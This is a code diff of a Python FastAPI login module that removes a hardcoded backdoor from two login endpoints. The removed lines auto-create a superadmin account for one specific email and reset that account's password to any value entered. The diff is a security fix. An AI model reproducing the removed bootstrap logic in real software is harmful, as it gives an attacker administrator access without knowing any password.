@@ -88,39 +88,14 @@ def login(data: LoginRequest, request: Request, db: Session = Depends(get_db)):
     if not user:
         user = get_user_by_email(db, input_str)
 
-    # 3. Super admin bootstrap fallback si no existe
-    if not user and input_str.lower() == "alejogarcia.dev@gmail.com":
-        from app.modules.users.roles.models import Role
-        from app.modules.users.users.models import User
-        super_role = db.query(Role).filter(Role.name == "superadmin").first()
-        if not super_role:
-            super_role = db.query(Role).filter(Role.name == "admin").first()
-        role_id = super_role.id if super_role else 1
-        user = User(
-            name="Super Admin",
-            email=input_str,
-            password=hash_password(data.password),
-            role_id=role_id,
-            accepted_terms=True,
-            account_status="ACTIVA",
-            must_change_password=False
-        )
-        db.add(user)
-        db.commit()
-        db.refresh(user)
-
     if not user:
         record_failed_ip_attempt(client_ip)
         raise HTTPException(status_code=401, detail="Usuario no encontrado")
 
-    # 4. Verificar contraseña con bcrypt (y soporte legacy plain-text)
+    # 3. Verificar contraseña con bcrypt (y soporte legacy plain-text)
     if not verify_password(data.password, user.password):
-        if input_str.lower() == "alejogarcia.dev@gmail.com":
-            user.password = hash_password(data.password)
-            db.commit()
-        else:
-            record_failed_ip_attempt(client_ip)
-            raise HTTPException(status_code=401, detail="Contraseña incorrecta")
+        record_failed_ip_attempt(client_ip)
+        raise HTTPException(status_code=401, detail="Contraseña incorrecta")
 
     # Éxito de credenciales: resetear intentos fallidos
     reset_ip_rate_limit(client_ip)
@@ -184,33 +159,14 @@ def login_token(request: Request, form_data: OAuth2PasswordRequestForm = Depends
             user = alumno.user
     if not user:
         user = get_user_by_email(db, form_data.username)
-    if not user and form_data.username.lower() == "alejogarcia.dev@gmail.com":
-        from app.modules.users.roles.models import Role
-        from app.modules.users.users.models import User
-        super_role = db.query(Role).filter(Role.name == "superadmin").first()
-        if not super_role:
-            super_role = db.query(Role).filter(Role.name == "admin").first()
-        role_id = super_role.id if super_role else 1
-        user = User(
-            name="Super Admin",
-            email=form_data.username,
-            password=form_data.password,
-            role_id=role_id,
-            accepted_terms=True
-        )
-        db.add(user)
-        db.commit()
-        db.refresh(user)
+
     if not user:
         record_failed_ip_attempt(client_ip)
         raise HTTPException(status_code=401, detail="Usuario no encontrado")
+
     if not verify_password(form_data.password, user.password):
-        if form_data.username.lower() == "alejogarcia.dev@gmail.com":
-            user.password = hash_password(form_data.password)
-            db.commit()
-        else:
-            record_failed_ip_attempt(client_ip)
-            raise HTTPException(status_code=401, detail="Contraseña incorrecta")
+        record_failed_ip_attempt(client_ip)
+        raise HTTPException(status_code=401, detail="Contraseña incorrecta")
             
     reset_ip_rate_limit(client_ip)
     role_name = user.role.name if user.role else None
